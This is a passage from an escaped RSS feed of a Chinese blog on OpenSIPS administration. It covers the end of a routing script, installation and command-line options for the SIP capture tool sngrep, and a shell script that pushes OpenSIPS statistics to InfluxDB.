&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;new branch at &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;onreply_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;handle_nat&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;incoming reply\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;failure_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;missed_call&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_was_cancelled&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment the following lines if you want to block client &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# redirect based on 3xx replies.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##if (t_check_status(&amp;#34;3[0-9][0-9]&amp;#34;)) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##t_reply(&amp;#34;404&amp;#34;,&amp;#34;Not found&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>sngrep: 最好用的sip可视化抓包工具</title>
      <link>https://wdd.js.org/opensips/tools/sngrep/</link>
      <pubDate>Tue, 02 Jul 2019 22:19:09 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/sngrep/</guid>
      <description>&lt;h1 id=&#34;1-安装&#34;&gt;1. 安装&lt;/h1&gt;
&lt;h2 id=&#34;11-centos&#34;&gt;1.1. centos&lt;/h2&gt;
&lt;p&gt;vim /etc/yum.repos.d/irontec.repo&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;irontec&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Irontec RPMs repository
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;baseurl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://packages.irontec.com/centos/$releasever/$basearch/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;rpm &amp;ndash;import &lt;a href=&#34;http://packages.irontec.com/public.key&#34;&gt;http://packages.irontec.com/public.key&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;yum install sngrep&lt;/p&gt;
&lt;h2 id=&#34;12-debianubuntu&#34;&gt;1.2 debian/ubuntu&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# debian 安装sngrep &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deb http://packages.irontec.com/debian jessie main&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/apt/sources.list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://packages.irontec.com/public.key -q -O - | apt-key add -
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install sngrep -y
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;debian buster 即 debian10以上可以直接 &lt;code&gt;apt-get install sngrep&lt;/code&gt; &lt;/p&gt;
&lt;h2 id=&#34;13-archmanjaro&#34;&gt;1.3 arch/manjaro&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;yay -Syu sngrep
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考： &lt;a href=&#34;https://aur.archlinux.org/packages/sngrep/&#34;&gt;https://aur.archlinux.org/packages/sngrep/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果报错，编辑 /etc/makepkg.conf文件，删除其中的&lt;code&gt;-Werror=format-security&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;CFLAGS=&amp;#34;-march=x86-64 -mtune=generic -O2 -pipe -fno-plt -fexceptions \
    -Wp,-D_FORTIFY_SOURCE=2 -Wformat -Werror=format-security \
    -fstack-clash-protection -fcf-protection&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;14-macos&#34;&gt;1.4 macOS&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;brew install sngrep
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-命令行参数&#34;&gt;2. 命令行参数&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Usage: sngrep [-hVcivNqrD] [-IO pcap_dump] [-d dev] [-l limit] [-B buffer] [-LHE capture_url] [&amp;lt;match expression&amp;gt;] [&amp;lt;bpf filter&amp;gt;]

    -h --help		 This usage
    -V --version	 Version information
    -d --device		 Use this capture device instead of default
    -I --input		 Read captured data from pcap file
    -O --output		 Write captured data to pcap file
    -B --buffer		 Set pcap buffer size in MB (default: 2)
    -c --calls		 Only display dialogs starting with INVITE
    -r --rtp		 Capture RTP packets payload
    -l --limit		 Set capture limit to N dialogs
    -i --icase		 Make &amp;lt;match expression&amp;gt; case insensitive
    -v --invert		 Invert &amp;lt;match expression&amp;gt;
    -N --no-interface	 Don&amp;#39;t display sngrep interface, just capture
    -q --quiet		 Don&amp;#39;t print captured dialogs in no interface mode
    -D --dump-config	 Print active configuration settings and exit
    -f --config		 Read configuration from file
    -F --no-config	 Do not read configuration from default config file
    -T --text	 Save pcap to text file
    -R --rotate		 Rotate calls when capture limit have been reached
    -H --eep-send	 Homer sipcapture url (udp:X.X.X.X:XXXX)
    -L --eep-listen	 Listen for encapsulated packets (udp:X.X.X.X:XXXX)
    -E --eep-parse	 Enable EEP parsing in captured packets
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-h --help&lt;/code&gt;: 显示帮助信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-V --version&lt;/code&gt;: 显示版本信息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-d --device&lt;/code&gt;: 指定抓包的网卡&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-I --input&lt;/code&gt;: 从pacp文件中解析sip包&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-O --output&lt;/code&gt;: 输出捕获的包到pacp文件中&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-c --calls&lt;/code&gt;: 仅显示invite消息&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-r --rtp&lt;/code&gt;: Capture RTP packets payload 捕获rtp包&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l --limit&lt;/code&gt;: 限制捕获对话的数量&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-i --icase&lt;/code&gt;: 使大小写不敏感&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v --invert&lt;/code&gt;: 颠倒（不太明白）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-N --no-interface&lt;/code&gt;: Don&amp;rsquo;t display sngrep interface, just capture&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-q --quiet&lt;/code&gt;: Don&amp;rsquo;t print captured dialogs in no interface mode&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-D --dump-config&lt;/code&gt;: Print active configuration settings and exit&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-f --config&lt;/code&gt;: Read configuration from file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-R --rotate&lt;/code&gt;: Rotate calls when capture limit have been reached.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-H --eep-send&lt;/code&gt;: Homer sipcapture url (udp:X.X.X.X:XXXX)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-L --eep-listen&lt;/code&gt;: Listen for encapsulated packets (udp:X.X.X.X:XXXX)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-k --keyfile&lt;/code&gt;: RSA private keyfile to decrypt captured packets&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-页面&#34;&gt;3. 页面&lt;/h1&gt;
&lt;p&gt;sngrep有四个页面，每个页面都有一些不同的快捷键。&lt;/p&gt;</description>
    </item>
    <item>
      <title>opensips监控</title>
      <link>https://wdd.js.org/opensips/ch3/opensips-monitor/</link>
      <pubDate>Tue, 02 Jul 2019 22:09:10 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/opensips-monitor/</guid>
      <description>&lt;p&gt;**opensipsctl fifo get_statistics all **命令可以获取所有统计数据，在所有统计数据中，我们只关心内存，事务和回话的数量。然后将数据使用curl工具写入到influxdb中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;opensipsctl fifo reset_statistics all 重置统计数据&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;常用指令&#34;&gt;常用指令&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;命令&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo which&lt;/td&gt;
          &lt;td&gt;显示所有可用命令&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo ps&lt;/td&gt;
          &lt;td&gt;显示所有进程&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get_statistics all&lt;/td&gt;
          &lt;td&gt;获取所有统计信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get_statistics core:&lt;/td&gt;
          &lt;td&gt;获取内核统计信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get_statistics net:&lt;/td&gt;
          &lt;td&gt;获取网路统计信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get_statistics pkmem:&lt;/td&gt;
          &lt;td&gt;获取私有内存相关信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get_statistics tm:&lt;/td&gt;
          &lt;td&gt;获取事务模块统计信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get_statistics sl:&lt;/td&gt;
          &lt;td&gt;获取sl模块统计信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get statistics shmem:&lt;/td&gt;
          &lt;td&gt;获取共享内存相关信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get statistics usrloc:&lt;/td&gt;
          &lt;td&gt;获取&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get statistics registrar:&lt;/td&gt;
          &lt;td&gt;获取注册统计信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get statistics uri:&lt;/td&gt;
          &lt;td&gt;获取uri统计信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo get statistics load:&lt;/td&gt;
          &lt;td&gt;获取负载信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;opensipsctl fifo reset_statistics all&lt;/td&gt;
          &lt;td&gt;重置所有统计信息&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shmem:total_size:: &lt;span style=&#34;color:#ae81ff&#34;&gt;6467616768&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shmem:used_size:: &lt;span style=&#34;color:#ae81ff&#34;&gt;4578374040&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shmem:real_used_size:: &lt;span style=&#34;color:#ae81ff&#34;&gt;4728909408&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shmem:max_used_size:: &lt;span style=&#34;color:#ae81ff&#34;&gt;4728909408&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shmem:free_size:: &lt;span style=&#34;color:#ae81ff&#34;&gt;1738707360&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shmem:fragments:: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;事务&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tm:UAS_transactions:: &lt;span style=&#34;color:#ae81ff&#34;&gt;296337&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tm:UAC_transactions:: &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tm:&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;xx_transactions:: &lt;span style=&#34;color:#ae81ff&#34;&gt;174737&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tm:&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;xx_transactions:: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tm:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;xx_transactions:: &lt;span style=&#34;color:#ae81ff&#34;&gt;110571&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tm:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;xx_transactions:: &lt;span style=&#34;color:#ae81ff&#34;&gt;2170&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tm:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;xx_transactions:: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tm:inuse_transactions:: &lt;span style=&#34;color:#ae81ff&#34;&gt;289651&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:active_dialogs:: &lt;span style=&#34;color:#ae81ff&#34;&gt;156&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:early_dialogs:: &lt;span style=&#34;color:#ae81ff&#34;&gt;680&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:processed_dialogs:: &lt;span style=&#34;color:#ae81ff&#34;&gt;104061&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:expired_dialogs:: &lt;span style=&#34;color:#ae81ff&#34;&gt;964&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:failed_dialogs:: &lt;span style=&#34;color:#ae81ff&#34;&gt;78457&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:create_sent:: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:update_sent:: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:delete_sent:: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:create_recv:: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:update_recv:: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dialog:delete_recv:: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CONF_DB_URL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ip:port&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# influxdb地址&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CONF_DB_NAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dbname&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# influxdb数据库名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CONF_OPENSIPS_ROLE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 角色，随便写个字符串&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LOCAL_IP&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;ip route get 8.8.8.8 | head -n +1 | tr -s &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; | cut -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; -f 7&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MSG&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;opensipsctl fifo get_statistics all | grep -E &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm:|shmem:|dialog&amp;#34;&lt;/span&gt; | awk -F &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BEGIN{OFS=&amp;#34;=&amp;#34;;ORS=&amp;#34;,&amp;#34;} {print $1,$2}&amp;#39;&lt;/span&gt; | sed &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/[-:.]/_/g&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MSG&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;MSG:0:&lt;span style=&#34;color:#e6db74&#34;&gt;${#&lt;/span&gt;MSG&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;-1&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo $MSG
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;influxdb&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&lt;/span&gt;$CONF_DB_URL&lt;span style=&#34;color:#e6db74&#34;&gt;/write?db=&lt;/span&gt;$CONF_DB_NAME&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -i -XPOST $influxdb  --data-binary &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;opensips,type=&lt;/span&gt;$CONF_OPENSIPS_ROLE&lt;span style=&#34;color:#e6db74&#34;&gt;,ip=&lt;/span&gt;$LOCAL_IP&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$MSG&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;shmem:total_size:: 33554432&lt;!-- raw HTML omitted --&gt;shmem:used_size:: 2910624&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;shmem:real_used_size:: 3722856&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;shmem:max_used_size:: 21963544&lt;!-- raw HTML omitted --&gt;shmem:free_size:: 29831576&lt;!-- raw HTML omitted --&gt;shmem:fragments:: 30761&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;core:rcv_requests:: 1625972&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;core:rcv_replies:: 580098&lt;!-- raw HTML omitted --&gt;core:fwd_requests:: 26146&lt;!-- raw HTML omitted --&gt;core:fwd_replies:: 0&lt;!-- raw HTML omitted --&gt;core:drop_requests:: 27&lt;!-- raw HTML omitted --&gt;core:drop_replies:: 0&lt;!-- raw HTML omitted --&gt;core:err_requests:: 0&lt;!-- raw HTML omitted --&gt;core:err_replies:: 0&lt;!-- raw HTML omitted --&gt;core:bad_URIs_rcvd:: 0&lt;!-- raw HTML omitted --&gt;core:unsupported_methods:: 0&lt;!-- raw HTML omitted --&gt;core:bad_msg_hdr:: 